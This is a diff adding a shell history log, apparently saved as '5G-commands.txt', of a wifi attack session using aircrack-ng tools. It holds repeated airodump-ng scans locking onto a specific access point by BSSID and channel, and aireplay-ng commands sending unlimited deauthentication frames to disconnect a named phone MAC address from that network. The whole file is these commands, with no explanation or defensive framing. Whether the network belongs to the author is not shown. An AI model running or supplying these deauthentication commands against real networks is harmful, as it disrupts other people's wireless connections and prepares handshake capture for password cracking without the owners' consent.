@@ -1,0 +1,34 @@
+  189  sudo airodump-ng wlan1
+  190  sudo airodump-ng --bssid $AP_MAC_ADDR wlan1
+  191  sudo airodump-ng -c11 -d $AP_MAC_ADDR wlan1
+  192  sudo aireplay-ng -0 0 -a $AP_MAC_ADDR -c $PHONE_MAC_ADDR wlan1
+  193  sudo airodump-ng --bssid $AP_MAC_ADDR wlan1
+  194  sudo aireplay-ng -0 0 -a $AP_MAC_ADDR -c $PHONE_MAC_ADDR wlan1
+  195  echo $AP_MAC_ADDR 
+  196  sudo aireplay-ng -0 0 -a fc:51:a4:21:fd:6e -c $PHONE_MAC_ADDR wlan1
+  197  sudo airodump-ng --bssid fc:51:a4:21:fd:6e wlan1
+  198  sudo airodump-ng --bssid $AP_MAC_ADDR wlan1
+  199  sudo airodump-ng wlan1
+  200  sudo airodump-ng wlan1 -band a
+  201  sudo airodump-ng wlan1 --band a
+  202  sudo airodump-ng --bssid FC:51:A4:21:FD:6C wlan1
+  203  sudo airodump-ng -c11 -d FC:51:A4:21:FD:6C wlan1
+  204  sudo airodump-ng -c36 -d FC:51:A4:21:FD:6C wlan1
+  205  sudo aireplay-ng -0 0 -a FC:51:A4:21:FD:6C -c $PHONE_MAC_ADDR wlan1
+  206  sudo airodump-ng --bssid FC:51:A4:21:FD:6C wlan1
+  207  echo $PHONE_MAC_ADDR 
+  208  sudo aireplay-ng -0 0 -a FC:51:A4:21:FD:6C -c D6:96:CF:15:DB:8C wlan1
+  209  sudo aireplay-ng -0 0 -a FC:51:A4:21:FD:6C -c $PHONE_MAC_ADDR wlan1
+  210  sudo airodump-ng --bssid FC:51:A4:21:FD:6C wlan1
+  211  sudo airodump-ng wlan1 --band a
+  212  sudo airodump-ng --bssid FC:51:A4:21:FD:6C wlan1
+  213  sudo airodump-ng --bssid FC:51:A4:21:FD:6C wlan1 --band a
+  214  sudo aireplay-ng -0 0 -a FC:51:A4:21:FD:6C -c D6:96:CF:15:DB:8C wlan1
+  215  sudo airodump-ng --bssid FC:51:A4:21:FD:6C wlan1 --band a
+  216  sudo airodump-ng -c140 -d FC:51:A4:21:FD:6C wlan1
+  217  sudo aireplay-ng -0 0 -a FC:51:A4:21:FD:6C -c D6:96:CF:15:DB:8C wlan1
+  218  sudo airodump-ng -c36 -d FC:51:A4:21:FD:6C wlan1
+  219  echo $PHONE_MAC_ADDR 
+  220  sudo aireplay-ng -0 0 -a FC:51:A4:21:FD:6C -c D6:96:CF:15:DB:8C wlan1
+  221  history
+  222  history > 5G-commands.txt
